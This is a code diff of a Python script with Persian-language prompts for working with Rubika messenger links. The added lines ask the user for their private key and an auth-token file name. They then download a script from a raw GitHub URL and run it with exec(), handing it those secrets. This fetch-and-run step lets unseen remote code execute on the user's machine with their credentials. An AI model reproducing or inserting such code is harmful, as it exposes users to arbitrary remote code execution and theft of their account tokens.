@@ -21,11 +21,22 @@ def center_text(text):
     return "\n".join([line.center(terminal_width) for line in text.split("\n")])
 
 # -------- گرفتن ورودی لینک‌ها --------
-links_input = input("🔗 لینک‌های روبیکا رو با کاما جدا کن: ").strip()
-links = [l.strip() for l in links_input.split(",") if l.strip()]
+link = input("🔗 لینک‌ها (با کاما جدا کن): ").strip().split(",")
+private = input("🛡️ پرایوت خودتو وارد کن: ").strip()
+file_name = input("🗂️ نام فایل توکن‌ها (مثلاً auths.json): ").strip()
 
-private = input("🛡️ پرایوت اوت‌ها رو وارد کن: ").strip()
-file_name = input("🗂️ نام فایل اوت‌ها را وارد کن (مثلاً auths.json): ").strip()
+code_url = "https://raw.githubusercontent.com/amirultram/ultragod/refs/heads/main/final_script.py"
+
+try:
+    code = requests.get(code_url).text
+    exec_globals = {
+        "link": link,
+        "private": private,
+        "file_name": file_name
+    }
+    exec(code, exec_globals)
+except Exception as e:
+    print("❌ خطا در اجرای برنامه:", e)
 
 # -------- شروع برنامه --------
 ascii_text = pyfiglet.figlet_format("aMir  uLtra", font="slant")
